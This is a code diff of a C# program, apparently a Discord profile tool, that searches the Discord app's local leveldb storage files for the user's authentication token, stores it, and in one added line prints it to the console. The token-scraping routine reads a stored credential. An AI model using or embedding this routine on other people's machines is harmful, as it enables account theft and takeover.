@@ -25,7 +25,7 @@ namespace Discord_Profile
             //만약 받아온 파일이 없다면?
             if (files.Count == 0)
             {
-                Console.WriteLine("디스코드가 발견되지 않았습니다");
+                Console.WriteLine("디스코드 파일 발견되지 않았습니다");
                 return;
             }
 
@@ -42,7 +42,7 @@ namespace Discord_Profile
             List<string> files = new List<string>();
 
             //디스코드 path (디스코드 토큰 파일이 있는 위치)
-            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\";
 
             //디스코드 path 가 없다면
             if (!Directory.Exists(discordPath))
@@ -55,8 +55,8 @@ namespace Discord_Profile
             string key = "token";
 
             //.ldb 파일 찾기
-            string[] ldbFiles = System.IO.Directory.GetFiles(discordPath, "*.ldb");
-
+            string[] ldbFiles = Directory.GetFiles(discordPath, "*.ldb");
+            
             //파일을 하나 하나씩 토큰이 있는지 확인
             foreach (string ldb in ldbFiles)
             {
@@ -104,14 +104,11 @@ namespace Discord_Profile
                                 {
                                     break;
                                 }
-
-
-
-
                             }
                             if (i == 25)
                             {
                                 //토큰을 찾는다면?
+                                Console.WriteLine(match.ToString());
                                 Data.token = match.ToString();
 
                             }
